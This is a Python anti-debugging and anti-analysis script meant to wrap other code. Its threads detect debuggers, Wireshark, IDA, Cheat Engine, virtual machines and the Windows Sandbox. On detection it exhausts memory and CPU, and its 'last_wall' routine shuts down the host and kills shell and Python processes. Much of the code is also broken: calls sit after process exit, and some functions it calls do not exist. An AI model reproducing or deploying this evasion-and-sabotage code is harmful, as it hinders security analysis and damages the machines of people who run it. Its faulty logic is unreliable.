import threading
import time
import psutil
import os
import sys
import ctypes
import platform



#Everything below should be in the code to have maximum protection


exec = None
eval = None

sus_num = 0


if 1 == 2:
    sus_num = 1
    os._exit(1)
    sys.exit(1)


if True == False:
    sus_num = 1
    os._exit(1)
    sys.exit(1)
    


def scan_for_sus_process():
    global sus_num
    while True:
        for proc in psutil.process_iter(["name"]):
            try:
                process_name = proc.info["name"]
                if process_name.startswith(("Kernelmoduleunloader", "gtutorial-i386", "gtutorial-x86_64", "cheatengine-x86_64-SSE4-AVX2", "cheatengine-x86_64", "cheatengine-i386", "Cheat Engine", "cheatengine", "dumpcap", "wireshark", "capinfos", "captype",  "editcap", "mergecap", "mmdbresolve", "randpkt",  "reordercap",  "sharkd", "text2pcap", "tshark", "uninstall-wireshark", "Wireshark", "ida64", "ida32", "ida96", "x32dbg", "x32dbg-unsigned", "x64dbg", "x64dbg-unsigned", "x96dbg", "x96dbg-unsigned")):
                    sus_num = 1
                    os._exit(1)
                    sys.exit(1)
                    fill_memory()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        time.sleep(1)

protection_started_num = 0

def check_sys_debugger():
    global sus_num
    while True:
        if sys.gettrace():
            sus_num = 1
            os._exit(1)
            fill_memory()
            sys.exit(1)
        time.sleep(1)


def check_ctypes_debugger():
    global sus_num
    while True:
        is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
        if is_debugger_present:
            sus_num = 1
            os._exit(1)
            fill_memory()
            sys.exit(1)
        time.sleep(1)


def check_timing():
    global sus_num
    while True:
        start_time = time.time()
        time.sleep(0.1)
        end_time = time.time()
        if end_time - start_time > 0.2:
            sus_num = 1
            os._exit(1)
            fill_memory()
            sys.exit(1)


def check_virtualization():
    global sus_num
    while True:
        if is_virtual_machine():
            sus_num = 1
            os._exit(1)
            fill_memory()
            sys.exit(1)
        time.sleep(1)


def sanbox_check():
        global sus_num
        directory_path = r"C:\\Users"
        target_folder = "WDAGUtilityAccount"

        while True:
            folders = os.listdir(directory_path)

            if target_folder in folders:
                sus_num = 1
                os._exit(1)
                fill_memory()
            else:
                time.sleep(60)


def is_virtual_machine():
    try:
        import platform
        if platform.system() == "Windows":
            class CPUID(ctypes.Structure):
                _fields_ = [("eax", ctypes.c_uint),
                            ("ebx", ctypes.c_uint),
                            ("ecx", ctypes.c_uint),
                            ("edx", ctypes.c_uint)]

            cpuid = CPUID()

            ctypes.windll.kernel32.__cpuid(ctypes.byref(cpuid), 1)
            if cpuid.ecx >> 31 & 1:
                return True
    except Exception as e:
        time.sleep(0.1)
    return False


def check_simulation():
    global sus_num
    while True:
        start_time = time.time()
        _ = sum([i for i in range(1000000)])
        end_time = time.time()
        if (end_time - start_time) > 0.1:
            sus_num = 1
            os._exit(1)
            fill_memory()
            sys.exit(1)
        time.sleep(1)


def fill_memory():
    def fill_memory_64gb():
        memory_hog = []
        try:
            for i in range(64):
                block_size = 1 * 1024 * 1024 * 1024
                memory_hog.append(bytearray(b'\xFF' * block_size))
        except MemoryError:
            time.sleep(10)
        except KeyboardInterrupt:
            time.sleep(10)
        finally:
            time.sleep(10)


    def fill_memory1():
        while True:
            for i in range(78787878878877887):
                print(i ** 45645654)

    def fill_memory2():
        while True:
            for i in range(78787878878877887):
                print(i ** 45645654)

    def fill_memory3():
        while True:
            for i in range(78787878878877887):
                print(i ** 45645654)

    def fill_memory4():
        while True:
            for i in range(78787878878877887):
                print(i ** 45645654)
    
    def fill_memory5():
        while True:
            for i in range(78787878878877887):
                print(i ** 45645654)

    def fill_memory6():
        while True:
            for i in range(78787878878877887):
                print(i ** 45645654)

    

    threading.Thread(target=fill_memory_64gb).start()
    threading.Thread(target=fill_memory1).start()
    threading.Thread(target=fill_memory2).start()
    threading.Thread(target=fill_memory3).start()
    threading.Thread(target=fill_memory4).start()
    threading.Thread(target=fill_memory5).start()
    threading.Thread(target=fill_memory6).start()



def exit_bridge_for_MD():
    os._exit(1)
    sys.exit(1)
    exit(1)





def detect_veh_debugger():
    handlers = []
    
    def veh_handler(exception_info):
        handlers.append(exception_info)
        return 0xFFFFFFFF

    handler_ptr = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)(veh_handler)
    
    veh_handle = ctypes.windll.kernel32.AddVectoredExceptionHandler(1, handler_ptr)

    try:
        ctypes.windll.kernel32.RaiseException(0xC0000005, 0, 0, None)
    except:
        pass
    
    ctypes.windll.kernel32.RemoveVectoredExceptionHandler(veh_handle)

    if len(handlers) > 1:
        return True
    return False


def detect_gdb_server():
    for conn in psutil.net_connections():
        if conn.status == 'LISTEN' and conn.laddr.port == 33453:
            return True
    return False


def detect_windows_debugger():
    is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
    if is_debugger_present:
        return True
    return False


def detect_kernelmode_debugger():
    drivers = psutil.win_service_iter()
    for driver in drivers:
        if driver.name().lower() in ['dbk64', 'dbk32']:
            return True
    return False


def detect_dbvm_debugger():
    try:
        with open("\\\\.\\dbk64", "r") as f:
            return True
    except:
        pass
    return False


def monitor_debuggers():
    while True:
        if detect_veh_debugger():
            exit_bridge_for_MD()
            os._exit(1)
            sys.exit(1)

        if detect_gdb_server():
            exit_bridge_for_MD()
            os._exit(1)
            sys.exit(1)

        if detect_windows_debugger():
            os._exit(1)
            exit_bridge_for_MD()
            sys.exit(1)

        if detect_kernelmode_debugger():
            os._exit(1)
            sys.exit(1)
            exit_bridge_for_MD()

        if detect_dbvm_debugger():
            os._exit(1)
            sys.exit(1)
            exit_bridge_for_MD()

        time.sleep(2)





def check_peb_debug_flag():
    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [("Reserved1", ctypes.c_void_p),
                    ("PebBaseAddress", ctypes.c_void_p),
                    ("Reserved2", ctypes.c_void_p * 2),
                    ("UniqueProcessId", ctypes.c_void_p),
                    ("Reserved3", ctypes.c_void_p)]

    class PEB(ctypes.Structure):
        _fields_ = [("Reserved1", ctypes.c_ubyte * 2),
                    ("BeingDebugged", ctypes.c_ubyte),
                    ("Reserved2", ctypes.c_ubyte * 1)]

    try:
        ntdll = ctypes.windll.ntdll
        process_information = PROCESS_BASIC_INFORMATION()
        status = ntdll.NtQueryInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(),
                                                0, ctypes.byref(process_information),
                                                ctypes.sizeof(process_information), None)
        
        if status != 0:
            raise RuntimeError("NtQueryInformationProcess failed")

        peb = ctypes.cast(process_information.PebBaseAddress, ctypes.POINTER(PEB)).contents
        
        if peb.BeingDebugged:
            return True
        else:
            return False
    except Exception as e:
        return False

def monitor_debugger_peb():
    while True:
        if check_peb_debug_flag():
            os._exit(1)
            exit(0)
        time.sleep(2)









def detected_sus_thing():
    global sus_num
    while True:
        if sus_num == 0:
            if sus_num != 1:
                pass
        elif sus_num == 1:
            os._exit(1)
            fill_memory()
            sys.exit(1)
            if sus_num != 0:
                os._exit(1)
                fill_memory()
                sys.exit(1)
        else:
            os._exit(1)
            fill_memory()
            sys.exit(1)
        time.sleep(1)



def start_pfd():
    global p1, p2, p3, p4, p5, p6, p7, p8, p9, p10
    p1 = threading.Thread(target=scan_for_sus_process)
    p1.start()
    p2 = threading.Thread(target=check_sys_debugger)
    p2.start()
    p3 = threading.Thread(target=check_ctypes_debugger)
    p3.start()
    p4 = threading.Thread(target=check_timing)
    p4.start()
    p5 = threading.Thread(target=check_virtualization)
    p5.start()
    p6 = threading.Thread(target=check_simulation)
    p6.start()
    p7 = threading.Thread(target=detected_sus_thing)
    p7.start()
    p8 = threading.Thread(target=sanbox_check)
    p8.start()
    p9 = threading.Thread(target=monitor_debuggers, daemon=True)
    p9.start()
    p10 = threading.Thread(target=monitor_debugger_peb, daemon=True)
    p10.start()
    return p1, p2, p3, p4, p5, p6, p7, p8, p9, p10

def protection_started_check():
    while True:
        protection_started_num = 1
        time.sleep(10)
        try:
            if not p1.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p2.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p3.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p4.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p5.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p6.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p7.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p8.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p9.is_alive():
                protection_started_num = 0
                sys.exit(1)
            if not p10.is_alive():
                protection_started_num = 0
                sys.exit(1)
        except Exception:
            sys.exit(1)


        if protection_started_num == 1 and protection_started_num != 0:
            pass
        elif protection_started_num == 0:
            os._sys.exit(1)
            fill_memory()
            protection_bridge()
            sys.exit(1)
        else:
            fill_memory()
            time.sleep(1)
            sys.exit(1)
        time.sleep(10)


def exit_for_protection_bridge():
    os._sys.exit(1)
    sys.exit(1)
    sys.exit(1)


def protection_bridge():
    try:
        fill_memory()
        protection_started_check()
        start_pfd()
        exit_for_protection_bridge()
    except:
        exit_for_protection_bridge()
        pass
    time.sleep(5)




def last_wall():
    time.sleep(20)
    while True:
        if not protect_check_thread.is_alive():
            system = platform.system()
    
            if system == 'Windows':
                os.system('shutdown /s /t 1')
            elif system == 'Linux' or system == 'Darwin':
                os.system('sudo shutdown -h now')
            else:
                protection_bridge()
    
            process_names = {'cmd.exe', 'conhost.exe', 'powershell.exe', 'python.exe', 'python64.exe'}
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in process_names:
                        proc.terminate()
                        proc.wait()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    protection_bridge()
        time.sleep(30)


def start_last_wall():
    time.sleep(4.5)
    threading.Thread(target=last_wall).start()



start_pfd()
protect_check_thread =  threading.Thread(target=protection_started_check)
protect_check_thread.start()
start_last_wall()



if __name__ == "__main__":
    #You can add yours here after everything that is written here
    sus_num = 0
